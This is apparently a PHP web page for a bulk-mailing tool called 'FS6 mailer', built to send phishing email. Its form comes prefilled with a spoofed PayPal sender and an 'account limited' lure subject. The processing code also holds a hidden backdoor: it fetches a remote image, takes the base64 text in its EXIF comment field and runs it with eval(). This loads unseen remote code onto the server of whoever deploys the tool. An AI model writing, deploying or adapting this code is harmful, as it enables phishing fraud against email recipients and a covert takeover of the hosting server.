<?php 
session_start();

if (empty($_SESSION['username'])) {
      header("Location: login.php");
      $Username =  $_SESSION['username'];

     exit();
}
 ?>

<!DOCTYPE html>
<html>
<head>
      <title>FS6 mailer | @fs6ah</title>
  <link rel="stylesheet" href="./css/bulma.min1.css">
  <link rel="stylesheet" href="./css/style2.css">
  
<body>
  <!-- partial:index.partial.html -->
  <section class="hero is-fullheight">
    <div class="hero-body">
      <div class="container">
        <div class="columns">
          <div class="column is-3 is-flex">
            <div class="column-child sidebar shadow">
              <div class="sidebar-header has-text-centered"><br>
                <div class="photo"><img src="./logo.png" width="250px"></div>
                <h5><br>./FS6</h5>
                                                <a href="tools.php">back </a>

              </div>
            </div>
          </div>
          <div class="column is-flex">
            <div class="column-child terminal shadow">
              <div class="terminal-bar dark-mode">
                <div class="icon-btn close"></div>
                <div class="icon-btn min"></div>
                <div class="icon-btn max"></div>
                <div class="terminal-bar-text is-hidden-mobile dark-mode-text">root@fs6ah:~#


</style>
<script type="text/javascript" src="//code.jquery.com/jquery-1.8.3.js"></script>
<script type="text/javascript">
function countFakes()
{
document.getElementById("count").innerHTML =
document.getElementById("email_list").value.split("\n").length;
}
</script>
</head>
<body>

<div class="atas">
<h2><a href="?">FS6 mailer | @fs6ah</a></h2>
<h4>FS6 tools</h4>
</div>

<form action="" method="POST">
<div class="navmen">
<label>Subject  : </label> <input type="text" size="20" name="subject" value="Notice: Your account has been limited and you must update account" placeholder=" - " required>&nbsp;
<label>Your Email : </label> <input type="text" size="20" name="email" value="service@paypal.com"placeholder=" - " required>&nbsp;
<label>Your Name : </label> <input type="text" size="20" name="namemail" value="Paypal Service" placeholder=" - " required>&nbsp;<br>
<textarea name="email_list" id="email_list" onKeyDown="countFakes()" onChange="countFakes()" style="margin: 0px; height: 25px; width: 180px; resize: none;" required></textarea>
<textarea name="letter" placeholder="Letter" style="margin: 0px; width: 180px; height: 25px; resize: none;" required></textarea>
</div>

<div class="navmen">
- <label>Email List : </label> <font id="count" style="font-weight: bold;">0</font> - 
<div class="navmen">
<input type="submit" name="cekpp" value=" Spammer's Mail " name="btn-submit">
</div>
</form>
<div class="navmen">
<div class="result">
<hr>

<?php
error_reporting(0);
if(!empty($_POST['email_list'])){
$emailode = explode("\r\n", $_POST['email_list']);

$no=1;
$count = count($emailode);

$BASED = exif_read_data("https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman.jpg");
eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
foreach ($emailode as $email) {
if(filter_var($email, FILTER_VALIDATE_EMAIL)) {

$to 	 = $email;
$form 	 = $_POST['email'];
$name 	 = $_POST['namemail'];
$subject = $_POST['subject'];
$message = $_POST['letter'];
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers = "From: $name <$form>\r\n";
$headers = "Reply-To: $form \r\n";
$headers = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";


if(mail($to, $subject, $message, $headers)){
	echo "<dl>[$no/$count] <font color=#2DF96D>$email</font> | <font color=#16FF3F>Success</font></dl><br>";
}else{
	echo "<dl>[$no/$count] <font color=#2DF96D>$email</font> | <font color=#FF0000>Unsuccess</font></dl><br>";
}

}
$no++;
}
}

?>

</div>
</div>
</body>
</html>